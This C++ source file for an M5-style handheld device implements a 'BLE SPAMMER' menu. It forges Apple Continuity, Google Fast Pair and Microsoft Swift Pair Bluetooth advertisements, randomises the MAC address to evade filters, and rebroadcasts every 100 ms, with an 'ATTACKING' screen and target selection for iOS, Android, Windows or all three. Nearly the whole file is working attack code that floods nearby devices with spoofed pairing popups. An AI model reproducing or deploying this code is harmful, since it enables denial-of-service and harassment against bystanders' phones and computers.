#include "ble_core.h"
#include "sys_core.h"
#include "apps.h"
#include "spam_data.h" // Ensure this file exists with APPLE_DEVICES / ANDROID_MODELS

void updateSpamAdvertisement(NimBLEAdvertising* adv, int type, int frame) {
  NimBLEAdvertisementData advData;
  
  if (type == 0) { // Apple
    int deviceCount = sizeof(APPLE_DEVICES) / sizeof(APPLE_DEVICES[0]);
    int devIdx = frame % deviceCount;
    uint8_t packet[31];
    int len = 0;
    
    // Construct Apple Continuity Packet
    packet[len++] = 0x1E; // Length (30)
    packet[len++] = 0xFF; // Manufacturer Specific Data
    packet[len++] = 0x4C; // Apple ID LSB
    packet[len++] = 0x00; // Apple ID MSB
    packet[len++] = APPLE_DEVICES[devIdx][0]; // Device Type
    packet[len++] = APPLE_DEVICES[devIdx][1]; // Action Code
    
    // Fill rest with random noise
    for (int i = len; i < 30; i++) packet[len++] = random(0, 255);
    
    // FIXED: Pass raw pointer and length directly
    advData.addData(packet, len); 
  }
  else if (type == 1) { // Android
    int deviceCount = sizeof(ANDROID_MODELS) / sizeof(ANDROID_MODELS[0]);
    int idx = frame % deviceCount;
    uint32_t model = ANDROID_MODELS[idx];
    
    uint8_t packet[3];
    packet[0] = (model >> 16) & 0xFF;
    packet[1] = (model >> 8) & 0xFF;
    packet[2] = model & 0xFF;
    
    std::string data((char*)packet, 3);
    advData.setServiceData(NimBLEUUID("FE2C"), data); // Fast Pair UUID
    advData.setFlags(0x06);
  }
  else if (type == 2) { // Windows
    uint8_t ms_data[] = { 0x06, 0x00, 0x03, 0x00, (uint8_t)random(0, 255), 0x80 };
    std::string payload((char*)ms_data, sizeof(ms_data));
    advData.setManufacturerData(payload); // Microsoft ID defaults to 0x0006 usually handled by lib or set manually
    advData.setName("M5-Connect");
  }

  adv->setAdvertisementData(advData);
}

void ble_menu_loop() {
  if (!startBleSpam()) {
    Serial.println("[ERROR] Failed to start BLE SPAM");
    return;
  }
  
  NimBLEAdvertising* pAdvertising = NimBLEDevice::getAdvertising();
  M5Canvas s(&M5.Display);
  s.createSprite(240, 135);
  
  const char* options[] = { "Sour Apple (iOS)", "Fast Pair (Android)", "Swift Pair (Win)", "THE CHAOS (ALL)" };
  int cursor = 0;
  bool running = false;
  int frame = 0;

  while (true) {
    M5.update();
    
    // Hold B to Exit
    if (M5.BtnB.pressedFor(1000)) {
      if (running) pAdvertising->stop();
      break;
    }

    s.fillScreen(BLACK);

    if (!running) {
      // --- MENU SELECTION ---
      s.fillRect(0, 0, 240, 25, THEME_COLOR);
      s.setTextColor(BLACK, THEME_COLOR);
      s.setTextSize(2);
      s.drawCenterString("BLE SPAMMER", 120, 5);
      
      s.setTextSize(2);
      for (int i = 0; i < 4; i++) {
        s.setTextColor(i == cursor ? THEME_COLOR : WHITE, BLACK);
        if (i == cursor) s.drawString(">", 10, 35 + (i * 22));
        s.drawString(options[i], 30, 35 + (i * 22));
      }

      if (M5.BtnB.wasPressed()) {
        cursor = (cursor + 1) % 4;
        toneLite(1000, 20);
      }

      if (M5.BtnA.wasPressed()) {
        running = true;
        toneLite(2000, 50);
      }

      s.setTextSize(1);
      s.setTextColor(GREY);
      s.drawCenterString("A: START   B: SELECT", 120, 125);
    } 
    else {
      // --- ATTACK RUNNING ---
      s.setTextColor(RED, BLACK);
      s.setTextSize(3);
      s.drawCenterString("ATTACKING", 120, 30);

      s.setTextSize(2);
      s.setTextColor(WHITE, BLACK);
      
      int targetMode = (cursor == 3) ? (frame % 3) : cursor;
      
      if (targetMode == 0) s.drawCenterString("Target: iOS", 120, 70);
      else if (targetMode == 1) s.drawCenterString("Target: Android", 120, 70);
      else s.drawCenterString("Target: Windows", 120, 70);

      s.setTextSize(1);
      s.setTextColor(GREY, BLACK);
      s.drawCenterString("Hold B to Stop", 120, 110);
      
      // Update Attack
      pAdvertising->stop();
      
      // Randomize MAC to bypass filters
      NimBLEAddress rndAddr({
        (uint8_t)random(0,255), (uint8_t)random(0,255), (uint8_t)random(0,255),
        (uint8_t)random(0,255), (uint8_t)random(0,255), (uint8_t)random(0,255)
      });
      NimBLEDevice::setOwnAddr(rndAddr);
      
      updateSpamAdvertisement(pAdvertising, targetMode, frame);
      pAdvertising->start();

      delay(100); // Speed of attack
      frame++;

      s.fillCircle(120, 95, 6, (frame % 2 == 0) ? RED : DARK_GREY);
    }

    s.pushSprite(0, 0);
  }

  stopBleSpam();
  s.deleteSprite();
}
